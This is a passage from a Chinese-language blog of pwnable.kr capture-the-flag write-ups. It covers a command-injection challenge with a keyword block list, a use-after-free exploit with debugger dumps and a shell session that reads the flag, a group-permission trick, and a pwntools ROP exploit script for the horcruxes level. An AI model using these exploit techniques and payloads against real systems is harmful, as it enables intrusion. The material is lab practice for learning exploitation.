4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">filter</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">cmd</span><span class="p">){</span>
        <span class="kt">int</span> <span class="n">r</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"="</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"PATH"</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"export"</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"/"</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"`"</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"flag"</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">r</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">extern</span> <span class="kt">char</span><span class="o">**</span> <span class="n">environ</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">delete_env</span><span class="p">(){</span>
        <span class="kt">char</span><span class="o">**</span> <span class="n">p</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">environ</span><span class="p">;</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span> <span class="n">p</span><span class="o">++</span><span class="p">)</span> <span class="n">memset</span><span class="p">(</span><span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="o">*</span><span class="n">p</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">**</span> <span class="n">envp</span><span class="p">){</span>
        <span class="n">delete_env</span><span class="p">();</span>
        <span class="n">putenv</span><span class="p">(</span><span class="s">"PATH=/no_command_execution_until_you_become_a_hacker"</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">filter</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="n">system</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</pre></table></code></div></div><h1 id="uaf">uaf</h1><p>释放后没有清空指针，又因为case2会重新申请chunk所以可以控制case1执行的函数</p><p>执行case1的逻辑如下</p><ol><li>将rbp-0x38处的堆地址放入rax<li>读取该堆地址0偏移处的值放入rax<li>调用rax偏移0x8处函数</ol><p>简单而言就是堆上内存指向的虚函数表会被调用，可以发现give_shell和introduce两个虚函数仅相差0x8偏移量。</p><p>我们修改堆上函数表的地址，使其向前指0x8个字节即可</p><p>需要注意的是fastbin先进后出，所以要调用case2两次覆盖m虚函数表地址才不会导致段错误</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="go">loc_400FCD:
mov     rax, [rbp+var_38]
mov     rax, [rax]
add     rax, 8
mov     rdx, [rax]
mov     rax, [rbp+var_38]
mov     rdi, rax
call    rdx
mov     rax, [rbp+var_30]
mov     rax, [rax]
add     rax, 8
mov     rdx, [rax]
mov     rax, [rbp+var_30]
mov     rdi, rax
call    rdx
jmp     loc_4010A9

</span><span class="gp">pwndbg&gt;</span><span class="w"> </span>x/16x <span class="nv">$rbp</span><span class="nt">-0x38</span>
<span class="go">0x7ffefe402978: 0x01bcbee0      0x00000000      0x01bcbf30      0x00000000
0x7ffefe402988: 0x004013b0      0x00000000      0x00000000      0x00000000
0x7ffefe402998: 0x00000000      0x00000000      0x004013b0      0x00000000
0x7ffefe4029a8: 0x00400de0      0x00000000      0x00000000      0x00000000
</span><span class="gp">pwndbg&gt;</span><span class="w"> </span>x/16x 0x1bcbee0
<span class="go">0x1bcbee0:      0x00401570      0x00000000      0x00000019      0x00000000
0x1bcbef0:      0x01bcbec8      0x00000000      0x00000031      0x00000000
0x1bcbf00:      0x00000004      0x00000000      0x00000004      0x00000000
0x1bcbf10:      0x00000000      0x00000000      0x6c6c694a      0x00000000
</span><span class="gp">pwndbg&gt;</span><span class="w"> </span>x/16x 0x401570
<span class="gp">0x401570 &lt;_ZTV3Man+16&gt;</span>: 0x0040117a      0x00000000      0x004012d2      0x00000000
<span class="gp">0x401580 &lt;_ZTV5Human&gt;</span>:  0x00000000      0x00000000      0x004015f0      0x00000000
<span class="gp">0x401590 &lt;_ZTV5Human+16&gt;</span>:       0x0040117a      0x00000000      0x00401192      0x00000000
<span class="gp">0x4015a0 &lt;_ZTS5Woman&gt;</span>:  0x6d6f5735      0x00006e61      0x00000000      0x00000000
</pre></table></code></div></div><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="gp">uaf@pwnable:~$</span><span class="w"> </span>python <span class="nt">-c</span> <span class="s1">'print "\x68\x15\x40\x00\x00\x00\x00\x00"'</span> <span class="o">&gt;</span> /tmp/hack
<span class="gp">uaf@pwnable:~$</span><span class="w"> </span>./uaf 8 /tmp/hack
<span class="go">1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>flag
<span class="go">yay_f1ag_aft3r_pwning
</span></pre></table></code></div></div><div class="language-cpp highlighter-rouge"><div class="code-header"> <span data-label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;cstring&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;cstdlib&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>

<span class="k">class</span> <span class="nc">Human</span><span class="p">{</span>
<span class="nl">private:</span>
        <span class="k">virtual</span> <span class="kt">void</span> <span class="n">give_shell</span><span class="p">(){</span>
                <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
        <span class="p">}</span>
<span class="nl">protected:</span>
        <span class="kt">int</span> <span class="n">age</span><span class="p">;</span>
        <span class="n">string</span> <span class="n">name</span><span class="p">;</span>
<span class="nl">public:</span>
        <span class="k">virtual</span> <span class="kt">void</span> <span class="n">introduce</span><span class="p">(){</span>
                <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"My name is "</span> <span class="o">&lt;&lt;</span> <span class="n">name</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
                <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"I am "</span> <span class="o">&lt;&lt;</span> <span class="n">age</span> <span class="o">&lt;&lt;</span> <span class="s">" years old"</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">};</span>

<span class="k">class</span> <span class="nc">Man</span><span class="o">:</span> <span class="k">public</span> <span class="n">Human</span><span class="p">{</span>
<span class="nl">public:</span>
        <span class="n">Man</span><span class="p">(</span><span class="n">string</span> <span class="n">name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">age</span><span class="p">){</span>
                <span class="k">this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
                <span class="k">this</span><span class="o">-&gt;</span><span class="n">age</span> <span class="o">=</span> <span class="n">age</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">virtual</span> <span class="kt">void</span> <span class="n">introduce</span><span class="p">(){</span>
                <span class="n">Human</span><span class="o">::</span><span class="n">introduce</span><span class="p">();</span>
                <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"I am a nice guy!"</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">};</span>

<span class="k">class</span> <span class="nc">Woman</span><span class="o">:</span> <span class="k">public</span> <span class="n">Human</span><span class="p">{</span>
<span class="nl">public:</span>
        <span class="n">Woman</span><span class="p">(</span><span class="n">string</span> <span class="n">name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">age</span><span class="p">){</span>
                <span class="k">this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
                <span class="k">this</span><span class="o">-&gt;</span><span class="n">age</span> <span class="o">=</span> <span class="n">age</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">virtual</span> <span class="kt">void</span> <span class="n">introduce</span><span class="p">(){</span>
                <span class="n">Human</span><span class="o">::</span><span class="n">introduce</span><span class="p">();</span>
                <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"I am a cute girl!"</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
        <span class="n">Human</span><span class="o">*</span> <span class="n">m</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Man</span><span class="p">(</span><span class="s">"Jack"</span><span class="p">,</span> <span class="mi">25</span><span class="p">);</span>
        <span class="n">Human</span><span class="o">*</span> <span class="n">w</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Woman</span><span class="p">(</span><span class="s">"Jill"</span><span class="p">,</span> <span class="mi">21</span><span class="p">);</span>

        <span class="kt">size_t</span> <span class="n">len</span><span class="p">;</span>
        <span class="kt">char</span><span class="o">*</span> <span class="n">data</span><span class="p">;</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">op</span><span class="p">;</span>
        <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
                <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"1. use</span><span class="se">\n</span><span class="s">2. after</span><span class="se">\n</span><span class="s">3. free</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
                <span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">op</span><span class="p">;</span>

                <span class="k">switch</span><span class="p">(</span><span class="n">op</span><span class="p">){</span>
                        <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
                                <span class="n">m</span><span class="o">-&gt;</span><span class="n">introduce</span><span class="p">();</span>
                                <span class="n">w</span><span class="o">-&gt;</span><span class="n">introduce</span><span class="p">();</span>
                                <span class="k">break</span><span class="p">;</span>
                        <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
                                <span class="n">len</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
                                <span class="n">data</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">char</span><span class="p">[</span><span class="n">len</span><span class="p">];</span>
                                <span class="n">read</span><span class="p">(</span><span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">),</span> <span class="n">data</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
                                <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"your data is allocated"</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
                                <span class="k">break</span><span class="p">;</span>
                        <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
                                <span class="k">delete</span> <span class="n">m</span><span class="p">;</span>
                                <span class="k">delete</span> <span class="n">w</span><span class="p">;</span>
                                <span class="k">break</span><span class="p">;</span>
                        <span class="nl">default:</span>
                                <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><h1 id="blukat">blukat</h1><p>这题侧重点在用户权限上，虽然代码里有栈溢出，但貌似不太好利用。</p><p>可以看到password文件属于blukat_pwn组，组内拥有读权限。而当前用户属于blukat_pwn组，所以可以顺利读取password内容</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">blukat@pwnable:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">total 20
-r-xr-sr-x 1 root blukat_pwn 9144 Aug  8  2018 blukat
-rw-r--r-- 1 root root        645 Aug  8  2018 blukat.c
-rw-r----- 1 root blukat_pwn   33 Jan  6  2017 password
</span><span class="gp">blukat@pwnable:~$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=1104(blukat) gid=1104(blukat) groups=1104(blukat),1105(blukat_pwn)
</span></pre></table></code></div></div><p>这里比较迷惑的是password内容本身就是Permission denied，容易上当。</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">blukat@pwnable:~$</span><span class="w"> </span><span class="nb">cat </span>password
<span class="go">cat: password: Permission denied
</span><span class="gp">blukat@pwnable:~$</span><span class="w"> </span>./blukat
<span class="go">guess the password!
cat: password: Permission denied
congrats! here is your flag: Pl3as_DonT_Miss_youR_GrouP_Perm!!
</span></pre></table></code></div></div><h1 id="horcruxes">horcruxes</h1><p>gets会被换行符和文件结束符截断，所以返回地址中出现’\x0a’的话就无法进行后续的覆盖。本题中ropme地址0x80a0009和获取flag的地址0x80a0160均含有截断符号，所以采取了0x809fffc处的call ropme指令完成跳转。</p><p>整个rop链的逻辑就是先跳转到7个输出函数获取随机数值，计算出sum后在ropme内输入即可。</p><p>另外程序中的atoi函数会将超过int的数值直接转化为-1，所以python脚本有时候会失败，没有对sum取余</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"0"</span><span class="p">,</span> <span class="mi">9032</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"/home/horcruxes/horcruxes"</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Menu:"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mh">0x74</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'A'</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'B'</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'C'</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'D'</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'E'</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'F'</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'G'</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x809fffc</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"earned? : "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"kill Voldemort</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="nb">sum</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="nb">sum</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"\+(.\w+)"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()))[</span><span class="mi">0</span><span class="p">])</span>
<span class="k">print</span><span class="p">(</span><span class="nb">sum</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Menu:"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"earned? : "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">sum</span><span class="p">))</span>

<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/exercise/'>Exercise</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pwnable/" class="post-tag no-text-decoration" >pwnable</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> 本文由作者按照 <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> 进行授权</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">分享</span> <span class="share-icons"> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="分享链接" data-title-succeed="链接已复制！"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">最近更新</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/%E7%A8%8B%E5%BA%8F%E7%BC%96%E8%AF%91%E4%B8%8E%E9%93%BE%E6%8E%A5/">程序编译与链接</a><li><a href="/posts/%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">高级网络攻防漏洞利用</a><li><a href="/posts/%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E9%80%86%E5%90%91/">高级网络攻防逆向</a><li><a href="/posts/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">Linux保护机制</a><li><a href="/posts/%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%931/">栈刷题小结</a></ul></div><div id="access-tags"><div class="panel-heading">热门标签</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/elf/">elf</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/pwnable/">pwnable</a> <a class="post-tag" href="/tags/memory/">memory</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/stack/">stack</a> <a class="post-tag" href="/tags/abi/">abi</a> <a class="post-tag" href="/tags/dram/">dram</a> <a class="post-tag" href="/tags/dynelf/">dynelf</a> <a class="post-tag" href="/tags/fmt/">fmt</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>相关文章</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/pwnable.kr%E5%88%B7%E9%A2%98/"><div class="card-body"> <em class="small" data-ts="1661652600" data-df="YYYY-MM-DD" > 2022-08-28 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>pwnable.kr刷题[Toddler's Bottle(8/21)]</h3><div class="text-muted small"><p> fd linux下文件描述符有下列三个特殊值 stdin stdout stderr 0 1 2 输入argv[1]为0x1234即可开启read(0, buf, 32); 之后程序会将我们在命令行输入的LETMEWIN读进buf #inclu...</p></div></div></a></div><div class="card"> <a href="/posts/pwnable.kr%E5%88%B7%E9%A2%983/"><div class="card-body"> <em class="small" data-ts="1662084600" data-df="YYYY-MM-DD" > 2022-09-02 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>pwnable.kr刷题[Toddler's Bottle(21/21)]</h3><div class="text-muted small"><p> input 对这种类型的题目不是很熟悉，看了别人的wp发现使用fork+pipe的方式在服务器运行c程序写入stderr区。而我自己做的部分用pwntools的process配置了argv和env，总体上而言做的很少。 这题是抄的wp，自己做的话可能永远也做不出来… 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ...</p></div></div></a></div><div class="card"> <a href="/posts/%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E9%80%86%E5%90%91/"><div class="card-body"> <em class="small" data-ts="1678421700" data-df="YYYY-MM-DD" > 2023-03-10 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>高级网络攻防逆向</h3><div class="text-muted small"><p> 课堂实验 junkcode 概要 给定一个64位Linux平台上的可执行文件，输入为一个数 字。请通过逆向分析，求解出符合要求的输入，打印出成功 字样 程序流程 主要流程图 该文件流程较为简洁，可以直接通过main函数进入程序的主要逻辑 main流程图 根据概要描述需要输入一个数字并得到成功字样，观察main函数的主要逻辑可以发现输入的数字存储在[rbp-0ch]处，并且...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/pwnable.kr%E5%88%B7%E9%A2%98/" class="btn btn-outline-primary" prompt="上一篇"><p>pwnable.kr刷题[Toddler's Bottle(8/21)]</p></a> <a href="/posts/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" class="btn btn-outline-primary" prompt="下一篇"><p>Linux保护机制</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/fengF3ng">fengF3ng</a>. <span data-toggle="tooltip" data-placement="top" title="除非另有说明，本网站上的博客文章均由作者按照知识共享署名 4.0 国际 (CC BY 4.0) 许可协议进行授权。">保留部分权利。</span></p></div><div class="footer-right"><p class="mb-0"> 本站由 <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> 生成，采用 <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> 主题。</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">热门标签</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/elf/">elf</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/pwnable/">pwnable</a> <a class="post-tag" href="/tags/memory/">memory</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/stack/">stack</a> <a class="post-tag" href="/tags/abi/">abi</a> <a class="post-tag" href="/tags/dram/">dram</a> <a class="post-tag" href="/tags/dynelf/">dynelf</a> <a class="post-tag" href="/tags/fmt/">fmt</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">发现新版本的内容。</p><button type="button" class="btn btn-primary" aria-label="Update"> 更新 </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">搜索结果为空</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script 